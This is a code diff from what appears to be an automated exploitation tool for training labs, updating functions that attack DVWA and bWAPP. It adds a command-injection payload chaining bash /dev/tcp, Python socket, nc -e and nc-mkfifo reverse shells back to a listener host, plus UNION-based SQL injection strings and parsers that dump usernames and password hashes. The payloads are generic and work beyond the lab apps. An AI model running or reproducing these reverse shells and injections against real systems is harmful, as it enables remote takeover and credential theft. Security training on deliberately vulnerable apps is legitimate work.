@@ -4341,9 +4341,22 @@ async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> di
     except Exception as e:
         return {"ok": False, "error": f"Could not bind reverse-shell port {lport}: {e}",
                 "cve": "DVWA-CMDI-Low"}
-    # 5. Submit the injected command. lhost=oscp_backend (Docker DNS) for
-    #    internal labs, or c2.vulnuslab.com for external.
-    payload = f"127.0.0.1; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &"
+    # 5. Submit the injected command. Use a multi-fallback payload so it works
+    #    regardless of whether the DVWA container has bash /dev/tcp, nc -e, or
+    #    only python. Each variant is tried in series; first one that connects wins.
+    py_oneline = (
+        f"python -c 'import socket,os,pty;s=socket.socket();"
+        f"s.connect((\"{lhost}\",{lport}));"
+        f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+    )
+    py3_oneline = py_oneline.replace("python", "python3")
+    bash_dev_tcp = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+    nc_e = f"nc {lhost} {lport} -e /bin/sh"
+    nc_mkfifo = (f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | "
+                 f"nc {lhost} {lport} > /tmp/f")
+    payload = (f"127.0.0.1; "
+               f"({bash_dev_tcp} || {py3_oneline} || {py_oneline} || "
+               f"{nc_e} || {nc_mkfifo}) >/dev/null 2>&1 &")
     try:
         # CSRF token first
         ipage = sess.get(f"{base}/vulnerabilities/exec/", timeout=8, verify=False)
@@ -4354,15 +4367,21 @@ async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> di
                   timeout=8, verify=False)
     except Exception:
         pass  # fire-and-forget — the bash may not return cleanly
-    # 6. Accept the reverse shell
+    # 6. Accept the reverse shell (extended timeout, the longer multi-fallback
+    #    payload can take a moment to traverse its fallbacks)
+    listener_sock.settimeout(20)
     try:
         conn, addr = listener_sock.accept()
     except _xpl_socket.timeout:
         try: listener_sock.close()
         except Exception: pass
-        return {"ok": False, "error": "Target did not call back within 15s. "
-                                       "Check lhost/lport reachability from target.",
-                "cve": "DVWA-CMDI-Low"}
+        return {"ok": False,
+                "error": (f"Target did not call back within 20s. Tried bash /dev/tcp, "
+                          f"python/python3, nc -e, and nc+mkfifo to {lhost}:{lport}. "
+                          f"Check that lab_dvwa can reach the backend container on the bridge "
+                          f"and that the listener port is bind-able."),
+                "cve": "DVWA-CMDI-Low",
+                "payload": payload}
     listener_sock.close()
     # 7. Wrap the captured socket in a StreamReader/Writer for our shell mgr
     loop = asyncio.get_event_loop()
@@ -4410,19 +4429,41 @@ async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
         payload = "1' UNION SELECT user,password FROM users-- -"
         url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
         r = sess.get(url, timeout=8, verify=False, cookies={"security": "low"})
-        # DVWA renders results as: First name: <user><br />Surname: <hash>
-        # Try several patterns since DVWA themes vary across image versions.
-        rows = re.findall(
-            r"First\s*name:\s*([^<\n]+?)\s*<br[^>]*>\s*Surname:\s*([^<\n]+?)\s*(?:</pre>|<br|\n)",
-            r.text, re.IGNORECASE | re.DOTALL)
+        # DVWA renders one <pre> block per row. Walk the blocks and pull the
+        # user + hash out of each by stripping HTML and scanning the plain text.
+        rows = []
+        pre_blocks = re.findall(r"<pre[^>]*>(.*?)</pre>", r.text,
+                                re.IGNORECASE | re.DOTALL)
+        for block in pre_blocks:
+            text = re.sub(r"<[^>]+>", " ", block)
+            text = re.sub(r"\s+", " ", text).strip()
+            m = re.search(r"First\s*name\s*:\s*([^\s][^:]*?)\s+Surname\s*:\s*(\S+)",
+                          text, re.IGNORECASE)
+            if m:
+                u = m.group(1).strip()
+                h = m.group(2).strip()
+                # Skip rows where the "user" is actually the original ID echo
+                if u and h and "UNION" not in u and "SELECT" not in u:
+                    rows.append((u, h))
+        # Fallback strategy 1: pair First-name values with any 32-char hashes
         if not rows:
-            # Fallback: scan for any 32-char hex strings (MD5 hashes DVWA uses)
+            md5s  = re.findall(r"\b([a-f0-9]{32})\b", r.text, re.IGNORECASE)
+            names = re.findall(r"First\s*name\s*:\s*([^<\n]+)", r.text, re.IGNORECASE)
+            names = [n.strip() for n in names if n.strip()]
+            if md5s and names:
+                rows = list(zip(names[:len(md5s)], md5s))
+        # Fallback strategy 2: if response contains hashes alone, still report them
+        if not rows:
             md5s = re.findall(r"\b([a-f0-9]{32})\b", r.text, re.IGNORECASE)
-            names_in_pre = re.findall(r"First\s*name:\s*([^<\n]+)", r.text, re.IGNORECASE)
-            if md5s and names_in_pre:
-                rows = list(zip(names_in_pre, md5s))
+            if md5s:
+                rows = [(f"row_{i+1}", h) for i, h in enumerate(md5s[:20])]
         if not rows:
-            return {"ok": False, "error": "SQL injection sent but no usernames/hashes parsed in DVWA response.",
+            preview = re.sub(r"<[^>]+>", " ", r.text)
+            preview = re.sub(r"\s+", " ", preview)[:200]
+            return {"ok": False,
+                    "error": (f"SQLi sent but no users/hashes found. The DVWA database "
+                              f"may not be initialised — visit /setup.php and click "
+                              f"'Create / Reset Database' first. Response preview: {preview}"),
                     "cve": "DVWA-SQLi-Low"}
         # Build the synthetic shell output
         dump_lines = ["=== DVWA users table dumped via SQL injection ==="]
@@ -4499,26 +4540,42 @@ async def exploit_juiceshop_admin(target: str, port: int, sid: str) -> dict:
 
 
 async def exploit_bwapp_sqli(target: str, sid: str) -> dict:
-    """bWAPP SQL Injection (security=low). Login bee/bug, level=0, then
-    UNION-inject the movies-search query so the visible columns (Title,
-    Release, Character, Genre, IMDb) carry users-table data. Parse the
-    rendered <td> cells back out."""
+    """bWAPP SQL Injection (security=low). Install DB, login bee/bug, then
+    UNION-inject the movies-search query so the visible columns carry
+    users-table data. Parse the rendered <td> cells back out."""
     base = f"http://{target}"
     sess = _req_lib.Session()
     try:
-        # bWAPP install (idempotent)
-        try: sess.get(f"{base}/install.php?install=yes", timeout=10, verify=False)
+        # 1. Run /install.php?install=yes — idempotent, creates the bWAPP DB +
+        #    populates default users (bee/bug). Without this the users table is empty
+        #    and the UNION returns no rows.
+        try:
+            sess.get(f"{base}/install.php?install=yes", timeout=20, verify=False,
+                     allow_redirects=True)
+            # Some bWAPP builds want a fresh GET on /install.php after to confirm
+            sess.get(f"{base}/install.php", timeout=8, verify=False)
         except Exception: pass
-        # Login bee/bug at security level 0
+        # 2. Login bee/bug at security level 0. bWAPP redirects first-time
+        #    users to a password-change page — we don't care, the session
+        #    cookie is set regardless of where we land.
         sess.post(f"{base}/login.php",
                   data={"login": "bee", "password": "bug", "security_level": "0",
                         "form": "submit"},
-                  timeout=8, verify=False)
-        # /sqli_1.php movies table has 7 columns: title, release, character, genre, imdb, etc.
-        # We inject a UNION that puts login in title and password (sha1) in release.
-        payload = "Iron Man' UNION SELECT 1,login,password,secret,email,7 FROM users-- -"
+                  timeout=8, verify=False, allow_redirects=True)
+        # 3. /sqli_1.php movies table has 7 columns:
+        #       id, title, release_year, character, genre, imdb, tickets_stock
+        #    We inject login in title (col 2), password in release (col 3),
+        #    so they render in the visible movie-search results.
+        payload = "Iron Man' UNION SELECT id,login,password,email,secret,activation_code,admin FROM users-- -"
         url = f"{base}/sqli_1.php?title={_xpl_urlparse.quote(payload)}&action=search"
         r = sess.get(url, timeout=10, verify=False)
+        # If we get the login page back, the session expired — try once more.
+        if "name=\"login\"" in r.text and "name=\"password\"" in r.text:
+            sess.post(f"{base}/login.php",
+                      data={"login": "bee", "password": "bug", "security_level": "0",
+                            "form": "submit"},
+                      timeout=8, verify=False, allow_redirects=True)
+            r = sess.get(url, timeout=10, verify=False)
         # Strategy 1: find <td>...login...</td><td>...sha1...</td> pairs
         # SHA1 in bWAPP is 40 hex chars
         creds = re.findall(
